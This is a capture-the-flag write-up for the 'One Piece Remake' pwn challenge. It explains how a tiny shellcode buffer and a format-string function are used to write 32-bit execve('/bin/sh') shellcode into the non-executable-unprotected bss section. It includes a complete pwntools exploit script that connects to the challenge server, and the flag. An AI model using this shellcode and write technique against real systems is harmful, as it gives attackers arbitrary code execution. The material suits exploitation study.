# One Piece Remake

## Analysis
The vulnerability looks pretty simple.  

```c
  menu();
  while ( 1 )
  {
    while ( 1 )
    {
      printf("(menu)>>");
      fgets(&s, 15, stdin);
      if ( strcmp(&s, "read\n") )
        break;
      readSC();
    }
    if ( !strcmp(&s, "run\n") )
    {
      runSC();
    }
    else if ( !strcmp(&s, "gomugomunomi\n") )
    {
      mugiwara();
    }
    else
    {
      if ( !strcmp(&s, "exit\n") )
        exit(1);
      puts("can you even read ?!");
    }
  }
```

We can input the shellcode to memory just use readSC() function.  
And execute the shellcode which wrote by us to memory just use runSC() function.  

However, the size of memory does not seem to be enough.  
So we need to think differently, there is format string bug in mugiwara() function, but we don't need to use this vulnerability.  

We can spray shellcodes through the mugiwara() function.  

```c
int mugiwara()
{
  char buf; // [sp+Ch] [bp-6Ch]@1

  puts("what's your name pirate ?");
  printf(">>");
  read(0, &buf, 0x64u);
  printf(&buf);
  return 0;
}
```

Thus, we just spray shellcodes through the mugiwara() function, and just jump to this relative offsets.  
But, some memory pointers overwrite our intact shellcodes, so our shellcode will be corrupted by stack unwinding.  
We can use only 16 bytes for shellcoding, I just use instructions for storing values to specific memory and just increseaing our esp register, and retn.  

```
0:  83 ec 60                sub    esp,0x60
3:  ff e4                   jmp    esp
```

We can use this two instructions for execute our shellcodes which are smaller than 16 bytes.  
And finally we can write 4 bytes to specific addresses.  

```
5:  b8 11 22 33 44          mov    eax,0x44332211
a:  c7 00 aa bb cc dd       mov    DWORD PTR [eax],0xddccbbaa
10: 83 c4 60                add    esp,0x60
13: c3                      ret
```

And, there is no NX mitigations, we may execute the shellcodes on bss sections.  
Finally, i wrote all of my shellcodes to bss section, and finally jumped to my shellcode safely.  

```python
from pwn import *

def pad_shellcode(shellcode):
    if len(shellcode) % 4 != 0:
        shellcode += ("\x90" * (4 - (len(shellcode) % 4)))
    return shellcode

def write_4_bytes_to_address(address, codes):
    p.recvuntil("(menu)>>")
    p.sendline("read")
    p.recvuntil(">>")
    p.send("\x83\xec\x60\xff\xe4")
    p.recvuntil("(menu)>>")
    p.sendline("gomugomunomi")
    p.recvuntil(">>")
    payload = "\xb8" + p32(address)
    payload += "\xc7\x00" + codes
    payload += "\x83\xc4\x60"
    payload += "\xc3"
    p.send(payload)
    p.recvuntil("(menu)>>")
    p.sendline("run")

def execute_shell():
    p.recvuntil("(menu)>>")
    p.sendline("read")
    p.recvuntil(">>")
    p.send("\x83\xec\x60\xff\xe4")
    p.recvuntil("(menu)>>")
    p.sendline("gomugomunomi")
    p.recvuntil(">>")
    payload = "\xb8\x48\xa0\x04\x08"
    payload += "\xff\xd0"
    p.send(payload)
    p.recvuntil("(menu)>>")
    p.sendline("run")

sub_esp = "\x81\xec\x00\x02\x00\x00"
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\x31\xd2\xcd\x80"
shellcode = pad_shellcode(shellcode)

#p = process("./one_piece_remake")
p = remote("onepiece.fword.wtf", 1236)
for i in range(0, len(shellcode), 4):
    write_4_bytes_to_address(0x0804a048 + i, shellcode[i:i+4])

execute_shell()
p.interactive()
```

Flag : FwordCTF{i_4m_G0inG_t0_B3coM3_th3_p1r4Te_K1NG}